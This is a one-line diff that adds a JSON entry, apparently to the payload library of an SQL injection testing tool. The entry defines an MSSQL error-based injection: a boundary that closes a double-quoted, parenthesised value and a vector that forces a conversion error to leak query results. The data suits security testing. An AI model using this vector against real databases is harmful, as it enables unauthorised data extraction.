@@ -1,0 +1,1 @@
+{"dbms": "mssql", "technique": "error", "boundary": {"prefix": "\")", "suffix": "-- -", "type": "paren-double"}, "vector": "{B} AND 1=convert(int,({Q}))", "comment": "mssql error: double in paren"}
